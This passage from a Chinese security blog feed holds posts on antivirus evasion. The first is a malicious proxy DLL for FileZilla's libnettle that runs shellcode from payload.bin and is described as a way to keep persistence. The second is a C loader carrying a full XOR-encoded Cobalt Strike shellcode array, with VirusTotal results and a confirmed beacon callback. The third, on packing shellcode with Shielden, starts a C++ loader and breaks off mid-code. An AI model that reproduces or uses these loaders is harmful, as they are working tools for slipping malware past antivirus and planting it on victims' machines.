&quot;&#x2F;export:nettle_xts_aes128_set_decrypt_key&#x3D;tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_set_encrypt_key&#x3D;tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_decrypt_message&#x3D;tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_encrypt_message&#x3D;tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_set_decrypt_key&#x3D;tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_set_encrypt_key&#x3D;tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_decrypt_message&#x3D;tmp2BF5.nettle_xts_decrypt_message,@475&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_encrypt_message&#x3D;tmp2BF5.nettle_xts_encrypt_message,@476&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_fast_reseed&#x3D;tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_init&#x3D;tmp2BF5.nettle_yarrow256_init,@478&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_is_seeded&#x3D;tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_needed_sources&#x3D;tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_random&#x3D;tmp2BF5.nettle_yarrow256_random,@481&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_seed&#x3D;tmp2BF5.nettle_yarrow256_seed,@482&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_slow_reseed&#x3D;tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_update&#x3D;tmp2BF5.nettle_yarrow256_update,@484&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow_key_event_estimate&#x3D;tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow_key_event_init&#x3D;tmp2BF5.nettle_yarrow_key_event_init,@486&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI DoMagic(LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14002954&#x2F;c-programming-how-to-read-the-whole-file-contents-into-a-buffer</span><br><span class="line">    FILE* fp;</span><br><span class="line">    size_t size;</span><br><span class="line">    unsigned char* buffer;</span><br><span class="line"></span><br><span class="line">    fp &#x3D; fopen(&quot;payload.bin&quot;, &quot;rb&quot;);</span><br><span class="line">    fseek(fp, 0, SEEK_END);</span><br><span class="line">    size &#x3D; ftell(fp);</span><br><span class="line">    fseek(fp, 0, SEEK_SET);</span><br><span class="line">    buffer &#x3D; (unsigned char*)malloc(size);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;ired.team&#x2F;offensive-security&#x2F;code-injection-process-injection&#x2F;loading-and-executing-shellcode-from-portable-executable-resources</span><br><span class="line">    fread(buffer, size, 1, fp);</span><br><span class="line">    </span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    </span><br><span class="line">    memcpy(exec, buffer, size);</span><br><span class="line">    </span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE threadHandle;</span><br><span class="line"></span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        &#x2F;&#x2F; https:&#x2F;&#x2F;gist.github.com&#x2F;securitytube&#x2F;c956348435cc90b8e1f7</span><br><span class="line">                &#x2F;&#x2F; Create a thread and close the handle as we do not want to use it to wait for it </span><br><span class="line">        threadHandle &#x3D; CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);</span><br><span class="line">        CloseHandle(threadHandle);</span><br><span class="line">    </span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Domagic函数从payload.bin中读取shellcode，之后使用virtualmalloc和malloc函数分配相应大小的内存空间，再将指针指向对应的空间执行shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI DoMagic(LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14002954&#x2F;c-programming-how-to-read-the-whole-file-contents-into-a-buffer</span><br><span class="line">    FILE* fp;</span><br><span class="line">    size_t size;</span><br><span class="line">    unsigned char* buffer;</span><br><span class="line"></span><br><span class="line">    fp &#x3D; fopen(&quot;payload.bin&quot;, &quot;rb&quot;);</span><br><span class="line">    fseek(fp, 0, SEEK_END);</span><br><span class="line">    size &#x3D; ftell(fp);</span><br><span class="line">    fseek(fp, 0, SEEK_SET);</span><br><span class="line">    buffer &#x3D; (unsigned char*)malloc(size);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;ired.team&#x2F;offensive-security&#x2F;code-injection-process-injection&#x2F;loading-and-executing-shellcode-from-portable-executable-resources</span><br><span class="line">    fread(buffer, size, 1, fp);</span><br><span class="line">    </span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    </span><br><span class="line">    memcpy(exec, buffer, size);</span><br><span class="line">    </span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dllmain函数为dll函数的入口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE threadHandle;</span><br><span class="line"></span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        &#x2F;&#x2F; https:&#x2F;&#x2F;gist.github.com&#x2F;securitytube&#x2F;c956348435cc90b8e1f7</span><br><span class="line">                &#x2F;&#x2F; Create a thread and close the handle as we do not want to use it to wait for it </span><br><span class="line">        threadHandle &#x3D; CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);</span><br><span class="line">        CloseHandle(threadHandle);</span><br><span class="line">    </span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原文章的原理如下图    </p><p>A：fzsftp.exe </p><p>B:tmp2BF5.dll(正常的libnettle-8.dll文件) </p><p>C:恶意libnettle-8.dll </p><p>E:payload.bin 存储shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/7bf01099-c86a-478d-977c-32479a0758df.png" alt="imgbed.cn图床"></a></p><p>实际操作中用cs直接生成的shellcode已经被杀软识别，因此免杀效果很差，将shellcode分离后远程加载并进行加密后才可以实现免杀。在实战中可以根据目标机器上安装的软件生成dll文件并替换，实现权限维持</p><p>参考</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1739263">https://cloud.tencent.com/developer/article/1739263</a></p><p><a href="https://github.com/Flangvik/SharpDllProxy">https://github.com/Flangvik/SharpDllProxy</a></p><p><a href="https://gist.github.com/securitytube/c956348435cc90b8e1f7">https://gist.github.com/securitytube/c956348435cc90b8e1f7</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>C编译xor加密shellcode免杀</title>
    <link href="/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/"/>
    <url>/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>cs生成c格式shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/1b827e97-670d-4cc1-a065-94ae3a37ff28.png" alt="imgbed.cn图床"></a></p><h3 id="用010editor加密shellcode"><a href="#用010editor加密shellcode" class="headerlink" title="用010editor加密shellcode"></a>用010editor加密shellcode</h3><p>Ctrl+Shift+V将shellcode复制到010editor中，选择Tools-&gt;Hex Operation-&gt;Binary Xor，设置运算数为0x97,将shellcode与0x97异或后生成新的shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/20a8b51b-68ea-41f9-bf16-7b29d1c5ec2c.png" alt="imgbed.cn图床"></a></p><p>将shellcode与0x97异或后生成新的shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/7022a482-b0fc-4cdd-afd3-f6a216810f02.png" alt="imgbed.cn图床"></a></p><p>Ctrl+Shift+c复制shellcode到Sublime text中，Ctrl+a选中全部将shellcode修改成c语言中的十六进制格式</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/ae866e91-0273-4a5e-a9c4-dd658bd32955.png" alt="imgbed.cn图床"></a></p><h3 id="Visual-Studio编译生成exe文件"><a href="#Visual-Studio编译生成exe文件" class="headerlink" title="Visual Studio编译生成exe文件"></a>Visual Studio编译生成exe文件</h3><p>将xor加密后的shellcode与0x97异或还原后执行</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f159cb36-9790-41c4-bbed-bfc7ba09150a.png" alt="imgbed.cn图床"></a></p><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall *CODE)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\x6B\xDF\x14\x73\x67\x7F\x5F\x97\x97\x97\xD6\xC6\xD6\xC7\xC5\xC6&quot;</span></span><br><span class="line"><span class="string">&quot;\xC1\xDF\xA6\x45\xF2\xDF\x1C\xC5\xF7\xDF\x1C\xC5\x8F\xDF\x1C\xC5&quot;</span></span><br><span class="line"><span class="string">&quot;\xB7\xDF\x1C\xE5\xC7\xDF\x98\x20\xDD\xDD\xDA\xA6\x5E\xDF\xA6\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x3B\xAB\xF6\xEB\x95\xBB\xB7\xD6\x56\x5E\x9A\xD6\x96\x56\x75\x7A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC5\xD6\xC6\xDF\x1C\xC5\xB7\x1C\xD5\xAB\xDF\x96\x47\xF1\x16\xEF&quot;</span></span><br><span class="line"><span class="string">&quot;\x8F\x9C\x95\xE2\xE5\x1C\x17\x1F\x97\x97\x97\xDF\x12\x57\xE3\xF0&quot;</span></span><br><span class="line"><span class="string">&quot;\xDF\x96\x47\xC7\x1C\xDF\x8F\xD3\x1C\xD7\xB7\xDE\x96\x47\x74\xC1&quot;</span></span><br><span class="line"><span class="string">&quot;\xDF\x68\x5E\xD6\x1C\xA3\x1F\xDF\x96\x41\xDA\xA6\x5E\xDF\xA6\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x3B\xD6\x56\x5E\x9A\xD6\x96\x56\xAF\x77\xE2\x66\xDB\x94\xDB\xB3&quot;</span></span><br><span class="line"><span class="string">&quot;\x9F\xD2\xAE\x46\xE2\x4F\xCF\xD3\x1C\xD7\xB3\xDE\x96\x47\xF1\xD6&quot;</span></span><br><span class="line"><span class="string">&quot;\x1C\x9B\xDF\xD3\x1C\xD7\x8B\xDE\x96\x47\xD6\x1C\x93\x1F\xDF\x96&quot;</span></span><br><span class="line"><span class="string">&quot;\x47\xD6\xCF\xD6\xCF\xC9\xCE\xCD\xD6\xCF\xD6\xCE\xD6\xCD\xDF\x14&quot;</span></span><br><span class="line"><span class="string">&quot;\x7B\xB7\xD6\xC5\x68\x77\xCF\xD6\xCE\xCD\xDF\x1C\x85\x7E\xD8\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x68\xCA\xFD\x97\xDE\x29\xE0\xFE\xF9\xFE\xF9\xF2\xE3\x97\xD6&quot;</span></span><br><span class="line"><span class="string">&quot;\xC1\xDE\x1E\x71\xDB\x1E\x66\xD6\x2D\xDB\xE0\xB1\x90\x68\x42\xDF&quot;</span></span><br><span class="line"><span class="string">&quot;\xA6\x5E\xDF\xA6\x45\xDA\xA6\x57\xDA\xA6\x5E\xD6\xC7\xD6\xC7\xD6&quot;</span></span><br><span class="line"><span class="string">&quot;\x2D\xAD\xC1\xEE\x30\x68\x42\x7C\xE4\xCD\xDF\x1E\x56\xD6\x2F\xC7&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\x97\x97\xDA\xA6\x5E\xD6\xC6\xD6\xC6\xFD\x94\xD6\xC6\xD6\x2D&quot;</span></span><br><span class="line"><span class="string">&quot;\xC0\x1E\x08\x51\x68\x42\x7C\xCE\xCC\xDF\x1E\x56\xDF\xA6\x45\xDE&quot;</span></span><br><span class="line"><span class="string">&quot;\x1E\x4F\xDA\xA6\x5E\xC5\xFF\x97\x95\xD7\x13\xC5\xC5\xD6\x2D\x7C&quot;</span></span><br><span class="line"><span class="string">&quot;\xC2\xB9\xAC\x68\x42\xDF\x1E\x51\xDF\x14\x54\xC7\xFD\x9D\xC8\xDF&quot;</span></span><br><span class="line"><span class="string">&quot;\x1E\x66\xDF\x1E\x4D\xDE\x50\x57\x68\x68\x68\x68\xDA\xA6\x5E\xC5&quot;</span></span><br><span class="line"><span class="string">&quot;\xC5\xD6\x2D\xBA\x91\x8F\xEC\x68\x42\x12\x57\x98\x12\x0A\x96\x97&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\xDF\x68\x58\x98\x13\x1B\x96\x97\x97\x7C\x44\x7E\x73\x96\x97&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\x7F\x35\x68\x68\x68\xB8\xED\xDE\xD1\xC3\x97\x78\x6F\xCF\x9C&quot;</span></span><br><span class="line"><span class="string">&quot;\xEF\x6F\x7B\x00\x38\x66\xFD\xA8\xFF\x7B\xCF\xF8\x9A\x4B\xA7\x08&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x69\x8B\x57\xDF\x10\xFE\x9E\xB6\x17\x81\xB4\xC6\x50\x5A\xE7&quot;</span></span><br><span class="line"><span class="string">&quot;\xFD\x31\x7C\xF6\x3A\xD4\xCA\x4D\xA2\x00\x6B\xBF\x1D\xB4\x62\x1B&quot;</span></span><br><span class="line"><span class="string">&quot;\xC6\xA3\x87\x19\xEE\x2E\xBA\x2A\x4B\xD8\x89\x65\xB2\xF3\xB0\xC8&quot;</span></span><br><span class="line"><span class="string">&quot;\xF3\x1B\x92\x1A\xFF\x97\xC2\xE4\xF2\xE5\xBA\xD6\xF0\xF2\xF9\xE3&quot;</span></span><br><span class="line"><span class="string">&quot;\xAD\xB7\xDA\xF8\xED\xFE\xFB\xFB\xF6\xB8\xA2\xB9\xA7\xB7\xBF\xF4&quot;</span></span><br><span class="line"><span class="string">&quot;\xF8\xFA\xE7\xF6\xE3\xFE\xF5\xFB\xF2\xAC\xB7\xDA\xC4\xDE\xD2\xB7&quot;</span></span><br><span class="line"><span class="string">&quot;\xA6\xA7\xB9\xA7\xAC\xB7\xC0\xFE\xF9\xF3\xF8\xE0\xE4\xB7\xD9\xC3&quot;</span></span><br><span class="line"><span class="string">&quot;\xB7\xA1\xB9\xA5\xAC\xB7\xC0\xFE\xF9\xA1\xA3\xAC\xB7\xEF\xA1\xA3&quot;</span></span><br><span class="line"><span class="string">&quot;\xAC\xB7\xC3\xE5\xFE\xF3\xF2\xF9\xE3\xB8\xA1\xB9\xA7\xBE\x9A\x9D&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\x64\xF1\xB2\xFD\x10\x92\x3B\x83\x57\x64\x8C\xAA\x47\xD8\x6B&quot;</span></span><br><span class="line"><span class="string">&quot;\xB3\xE3\xBE\xF9\x75\x1C\xA5\xD6\x70\x91\xE2\xF2\x6A\xA1\xB6\xF0&quot;</span></span><br><span class="line"><span class="string">&quot;\x32\x70\x6D\x9F\xE9\xD6\x2F\xA9\x34\x2F\x15\x73\xD8\x66\x8F\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x1D\x9A\xCA\xBF\x50\x3C\x69\x66\xA7\x99\xB9\x80\xF3\xEF\x82\x8E&quot;</span></span><br><span class="line"><span class="string">&quot;\xC2\xC5\x9A\x01\xD2\xDC\x79\x99\xEE\x32\x4C\x6C\xB0\x2E\x1E\xF0&quot;</span></span><br><span class="line"><span class="string">&quot;\xCD\x26\x7C\xE3\x1D\x78\x82\xF1\xFD\x88\xB7\x23\x9D\xCC\x7A\x5A&quot;</span></span><br><span class="line"><span class="string">&quot;\xE5\x46\xF0\xD7\xCA\xCC\x3E\xAB\xF5\x09\xBB\x3C\x52\x1E\xAB\x1A&quot;</span></span><br><span class="line"><span class="string">&quot;\x3A\x2F\xF7\x1E\xF7\xCF\xA6\x2B\x93\xBF\xAB\xFB\xF7\x44\x2E\xD8&quot;</span></span><br><span class="line"><span class="string">&quot;\x69\x64\x26\xD9\xB6\xB2\xB9\xDF\xF6\x27\x52\x8A\x1A\x26\x81\x14&quot;</span></span><br><span class="line"><span class="string">&quot;\xFD\xD6\x88\xD6\x23\x1F\x6E\xFC\x09\x30\x57\xEC\x80\xE1\x14\xF9&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x5A\x84\xA4\x85\xA1\xC8\xE2\x43\xFC\x6E\x18\x95\x90\x7E\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\x03\x78\x32\x18\x9A\x89\xDA\xAF\x84\x5B\x95\x21\x78\xF4\xA3\x7F&quot;</span></span><br><span class="line"><span class="string">&quot;\x82\x36\x32\xE0\x44\x13\x1A\x39\xE2\x47\xE7\xED\xA3\x93\x80\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x05\xCC\x5A\xBD\x3E\x97\xD6\x29\x67\x22\x35\xC1\x68\x42\xDF\xA6&quot;</span></span><br><span class="line"><span class="string">&quot;\x5E\x2D\x97\x97\xD7\x97\xD6\x2F\x97\x87\x97\x97\xD6\x2E\xD7\x97&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\x97\xD6\x2D\xCF\x33\xC4\x72\x68\x42\xDF\x04\xC4\xC4\xDF\x1E&quot;</span></span><br><span class="line"><span class="string">&quot;\x70\xDF\x1E\x66\xDF\x1E\x4D\xD6\x2F\x97\xB7\x97\x97\xDE\x1E\x6E&quot;</span></span><br><span class="line"><span class="string">&quot;\xD6\x2D\x85\x01\x1E\x75\x68\x42\xDF\x14\x53\xB7\x12\x57\xE3\x21&quot;</span></span><br><span class="line"><span class="string">&quot;\xF1\x1C\x90\xDF\x96\x54\x12\x57\xE2\x40\xCF\xCF\xCF\xDF\x92\x97&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\x97\x97\xC7\x54\x7F\x08\x6A\x68\x68\xA6\xAE\xA5\xB9\xA6\xA1&quot;</span></span><br><span class="line"><span class="string">&quot;\xAF\xB9\xA5\xA7\xA3\xB9\xA6\xA3\xA4\x97\x85\xA3\xC1\xEF&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xorshellcode[<span class="keyword">sizeof</span>(shellcode)];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(shellcode) - <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">xorshellcode[i] = shellcode[i]^<span class="number">0x97</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">p = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(xorshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(p, xorshellcode, <span class="keyword">sizeof</span>(xorshellcode));</span><br><span class="line"></span><br><span class="line">CODE code = (CODE)p;</span><br><span class="line">code();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="免杀效果测试"><a href="#免杀效果测试" class="headerlink" title="免杀效果测试"></a>免杀效果测试</h3><p>VirusTotal查杀率15/69</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a804f20c-8eb6-4db4-aa98-324b5a9c4986.png" alt="imgbed.cn图床"></a></p><p>火绒不杀，卡巴斯基拦截</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/45697d62-b406-4d79-83a6-462a04dc8852.PNG" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/9e78c239-76a2-49d2-805f-b46a693dfbcb.PNG" alt="imgbed.cn图床"></a></p><p>cs上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/0b236383-c34f-4c7a-9109-0296c508e850.png" alt="imgbed.cn图床"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a href="https://www.freebuf.com/articles/system/228233.html">https://www.freebuf.com/articles/system/228233.html</a></p><p><a href="https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html">https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>C编译shellcode+shielden加壳免杀火绒、卡巴斯基</title>
    <link href="/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/"/>
    <url>/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="CS-生成-shellcode"><a href="#CS-生成-shellcode" class="headerlink" title="CS 生成 shellcode"></a>CS 生成 shellcode</h2><p>在Payload Generator处选择veil，生成shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/9dff81e4-191f-4d44-8f08-a2fac8489af8.png" alt="imgbed.cn图床"></a></p><p>生成shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/1daf2a48-354c-40fb-bf53-f844e5b15f41.png" alt="imgbed.cn图床"></a></p><h2 id="使用Visual-Studio-2017编译shellcode"><a href="#使用Visual-Studio-2017编译shellcode" class="headerlink" title="使用Visual Studio 2017编译shellcode"></a>使用Visual Studio 2017编译shellcode</h2><p>复制shellcode到以下代码中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MSF.cpp : 此文件包含 &quot;main&quot; 